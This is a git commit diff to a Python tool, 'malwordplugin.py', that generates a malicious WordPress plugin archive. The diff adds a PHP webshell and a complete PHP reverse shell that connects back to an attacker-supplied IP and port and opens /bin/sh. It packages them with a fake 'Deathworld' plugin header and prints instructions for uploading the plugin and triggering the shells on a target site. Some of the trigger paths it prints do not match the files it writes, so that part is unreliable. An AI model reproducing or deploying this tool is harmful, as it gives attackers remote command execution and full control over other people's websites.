5c7c89c29de8e28b286cf8586140a06684e43f13
Your Name <you@example.com>
2024-12-02 10:49:44 -0500

    added first functions

--- malwordplugin.py
+++ malwordplugin.py
@@ -12,7 +12,7 @@
 #                   reversshell, a webshell,
 #                   without using metasploit
 #
-import argeparse
+import argparse
 import pathlib
 import os
 from random import randint 
@@ -29,57 +29,160 @@ def parseargs():
     parser.add_argument('-d',
                         '--dest',
                         type=str,
-                        describtion="backconnect ip",
+                        #description="backconnect ip",
                         required=True)
     parser.add_argument('-p',
                         '--port',
                         type=int,
-                        describtion="backconnect port",
+                        #description="backconnect port",
                         required=True)
     parser.add_argument('-l',
                         '--listner',
-                        decribtion="should a nc listner be started",
+                        #description="should a nc listner be started",
                         action='store_true')
     parser.add_argument('-o',
                         '--output',
                         type=str,
-                        describtion="output path",
-                        default="./")
+                        #description="output path",
+                        default=".")
     return parser.parse_args()
 
 
-def createwebshell():
+def generatewebshell():
     """creating the content of the webshell."""
     content = "<?php\n"
     content += "system($_GET['cmd']);?>\n"
     return content
 
 
-def creatrevshell(dest, port):
+def generaterevshell(dest, port):
     """creating a reverse shell with the given port and dest.
 
     :param dest: ip or url to connect to
     :param port: port to connect to
     :returns: reverseshell as string
     """
-    return ""
+    php_shell = f"""<?php
+    set_time_limit (0);
+    $VERSION = "1.0";
+    $ip = '{dest}';  // CHANGE THIS
+    $port = {port};       // CHANGE THIS
+    $chunk_size = 1400;
+    $write_a = null;
+    $error_a = null;
+    $shell = 'uname -a; w; id; /bin/sh -i';
+    $daemon = 0;
+    $debug = 0;
 
+    if (function_exists('pcntl_fork')) {{
+        $pid = pcntl_fork();
+        if ($pid == -1) {{
+            printit("ERROR: Can't fork");
+            exit(1);
+            }}
+            if ($pid) {{
+                exit(0);  // Parent exits
+            }}
+            if (posix_setsid() == -1) {{
+                printit("Error: Can't setsid()");
+                exit(1);
+            }}
+        $daemon = 1;
+    }} else {{
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+    }}
 
-def generatefilenames():
-    """generates the 2 diffrent filenames."""
-    return "web","reverse"
+    chdir("/");
 
+    umask(0);
+
+    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
+    if (!$sock) {{
+        printit("$errstr ($errno)");
+        exit(1);
+    }}
+
+    $descriptorspec = array(
+    0 => array("pipe", "r"),
+    1 => array("pipe", "w"),
+    2 => array("pipe", "w")
+    );
+
+    $process = proc_open($shell, $descriptorspec, $pipes);
+
+    if (!is_resource($process)) {{
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+    }}
+
+    stream_set_blocking($pipes[0], 0);
+    stream_set_blocking($pipes[1], 0);
+    stream_set_blocking($pipes[2], 0);
+    stream_set_blocking($sock, 0);
+
+    printit("Successfully opened reverse shell to $ip:$port");
+
+    while (1) {{
+        if (feof($sock)) {{
+            printit("ERROR: Shell connection terminated");
+            break;
+        }}
+
+        if (feof($pipes[1])) {{
+            printit("ERROR: Shell process terminated");
+            break;
+        }}
+
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        if (in_array($sock, $read_a)) {{
+            if (($input = fread($sock, $chunk_size)) === false) {{
+                break;
+            }}
+            fwrite($pipes[0], $input);
+        }}
+
+        if (in_array($pipes[1], $read_a)) {{
+            if (($input = fread($pipes[1], $chunk_size)) === false) {{
+                break;
+            }}
+            fwrite($sock, $input);
+        }}
+
+        if (in_array($pipes[2], $read_a)) {{
+            if (($input = fread($pipes[2], $chunk_size)) === false) {{
+                break;
+                }}
+            fwrite($sock, $input);
+        }}
+    }}
+
+    fclose($sock);
+    fclose($pipes[0]);
+    fclose($pipes[1]);
+    fclose($pipes[2]);
+    proc_close($process);
+
+        function printit($string) {{
+            if (!$daemon) {{
+                print "$string\\n";
+            }}
+        }}
+        ?>
+        """
+    return php_shell
 
 
 def generatepluginscript():
     """generates the needed plugin script."""
     content = "<?php\n"
-    contnet += "/**\n"
+    content += "/**\n"
     content += " * Plugin Name: Deathworld\n"
-    content += f" * Version: {randint(1,42}.{randint(1,42)}.{randint(1,42}\n"
+    content += f" * Version: {randint(1,42)}.{randint(1,42)}.{randint(1,42)}\n"
     content += " * Author: humanity\n"
     content += " * Author URI: https://google.com"
-    content *= " * License: GPL2\n"
+    content += " * License: GPL2\n"
     content += " */\n"
     content += "?>\n"
     return content
@@ -90,21 +193,24 @@ def prepareplugin(args):
 
     :param args: arguments parsed
     """
-    print("[+] started to prepare Plugin"
+    print("[+] started to prepare Plugin")
     # create working directory
     p = pathlib.Path("temp/")
     p.mkdir(parents=True, exist_ok=True)
-    print("[+] created temporary folder"
+    print("[+] created temporary folder")
     #store the plugin script in it
     with open("temp/Deathworld.php", 'w') as f:
         pluginscript = generatepluginscript()
         f.write(pluginscript)
     print("[+] plugin script writen")
-    # generate name for the webshell
     # store the webshell
-    # generate reverseshell
+    with open("temp/WebModule.php", 'w') as f:
+        web_shell = generatewebshell()
+        f.write(web_shell)
     # store reversshell
-
+    with open("temp/RemoteModule.php", 'w') as f:
+        rev_shell = generaterevshell(args.dest, args.port)
+        f.write(rev_shell)
 
 
 def createplugin(args):
@@ -112,6 +218,21 @@ def createplugin(args):
 
     :param args: aguments parsed
     """
+    print("[+] Writing files to zip")
+    make_zip = zipfile.ZipFile(f"{args.output}/malicious.zip", 'w')
+    make_zip.write('temp/WebModule.php')
+    make_zip.write('temp/RemoteModule.php')
+    make_zip.write('temp/Deathworld.php')
+    print("[+] Cleaning up files")
+    os.system("rm -rf temp")
+    # Useful Info
+    print("[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload")
+    print("[+] How to trigger the reverse shell : ")
+    print("      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php")
+    print("      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php")
+    print("      ->   http://(target)/wp-content/plugins/malicious/SWebTheme.php?cmd=ls")
+
+
 
 if __name__ == "__main__":
     args = parseargs()
